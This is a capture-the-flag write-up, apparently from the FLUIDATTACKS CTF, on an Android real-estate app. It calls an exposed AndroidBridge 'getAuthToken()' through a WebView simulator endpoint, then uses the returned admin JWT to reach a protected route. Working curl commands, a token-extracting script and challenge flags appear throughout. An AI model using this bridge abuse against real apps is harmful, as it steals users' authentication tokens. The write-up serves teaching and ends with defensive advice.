# Glass Houses

> Android real-estate app (FluidRealty) with deep links and a WebView bridge. The API exposes a WebView simulator wired to an `AndroidBridge` JavaScript interface.
> **Flag:** `flag{bb30e8d1f9ba3f7d}`

---

## Solution

### 1. Decompile and read the client

Static analysis of the decompiled APK shows the original base URL and headers:

```text
Base URL: https://api.fluidrealty.co/
X-App-Version: 3.7.2
X-Platform: android
```

Relevant endpoints in `ApiService.java`:

```text
GET  /api/properties
GET  /api/properties?city=...
GET  /api/properties/admin   (Authorization: Bearer <token>)
```

`TokenManager.java` tries to reuse a token from `SharedPreferences`; when none
exists it calls `requestNewToken()`, which returns `null`. The app therefore never
holds a real token on its own.

### 2. The dangerous WebView

`WebViewActivity.java` enables JavaScript and file access, and attaches a bridge:

```java
setJavaScriptEnabled(true);
setAllowFileAccess(true);
setAllowContentAccess(true);
setAllowUniversalAccessFromFileURLs(true);
setAllowFileAccessFromFileURLs(true);
addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
```

`AndroidBridge` exposes `getAuthToken()`, `getDeviceId()`, `getAppVersion()`,
`showToast()` and `logEvent()`.

### 3. Enumerate the instance

```bash
$ curl -s https://deea9f3c4f107dda.chal.ctf.ae/
{"endpoints":["/api/properties","/api/properties/admin","/api/deeplink/process","/api/webview/simulate"],"service":"FluidRealty API","version":"3.7.2"}
```

The admin route requires a Bearer token:

```bash
$ curl -s https://deea9f3c4f107dda.chal.ctf.ae/api/properties/admin
{"error":"Authentication required","message":"Provide a valid Bearer token"}
```

### 4. Call the bridge from the simulator

The service exposes `/api/webview/simulate`, which runs JavaScript inside a
simulated WebView that still has the `AndroidBridge` interface attached:

```bash
$ curl -sk -X POST https://deea9f3c4f107dda.chal.ctf.ae/api/webview/simulate \
  -H 'Content-Type: application/json' \
  --data '{"javascript":"AndroidBridge.getAuthToken()"}'
```

The response contains an admin JWT:

```text
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9...
```

### 5. Use the token

```bash
$ curl -s https://deea9f3c4f107dda.chal.ctf.ae/api/properties/admin \
  -H "Authorization: Bearer <token>"
{"flag":"flag{bb30e8d1f9ba3f7d}","message":"Access granted to classified listings", ...}
```

### 6. Flag

```text
flag{bb30e8d1f9ba3f7d}
```

### New instance (current run)

Against `https://0a9039eb3ac572c3.chal.ctf.ae`:

```bash
TOKEN=$(curl -sk -X POST 'https://0a9039eb3ac572c3.chal.ctf.ae/api/webview/simulate' \
  -H 'Content-Type: application/json' \
  --data '{"javascript":"AndroidBridge.getAuthToken()"}' \
  | sed -E 's/.*"result":"([^"]+)".*/\1/')
curl -sk 'https://0a9039eb3ac572c3.chal.ctf.ae/api/properties/admin' \
  -H "Authorization: Bearer $TOKEN"
```

```text
flag{5707f4cf3f19a184}
```

## Lesson

`addJavascriptInterface` on a WebView that loads untrusted content gives any
injected script the same privileges as the app, including token access. Restrict
the loaded origins, disable file access, and never expose authentication material
through a JavaScript bridge.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
